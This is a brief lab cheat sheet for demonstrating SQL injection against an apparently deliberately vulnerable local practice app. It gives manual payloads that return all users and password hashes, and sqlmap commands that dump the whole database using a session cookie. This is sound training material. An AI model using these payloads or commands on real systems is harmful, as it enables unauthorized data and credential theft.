# SQL Injection Demo

## Manual

- Get all users
  
```sql
 1' or 1 = '1
```

- Get password hashes
  
```sql
 ' UNION SELECT user, password FROM users#
```


## URL to Test

[http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit#](http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit#)

## Cookie Data to Send

- PHPSESSID: `0bf460cc2a7016175bb93c7b6e82c30b` change it.
- security: `low`

## Attack to Show All Data

```bash
sudo sqlmap -u "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=0bf460cc2a7016175bb93c7b6e82c30b;security=low" --dump-all
```

## Attack to Get Specific Data

```bash
sudo sqlmap -u "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=0bf460cc2a7016175bb93c7b6e82c30b;security=low" --banner --current-user --current-db --dump
```
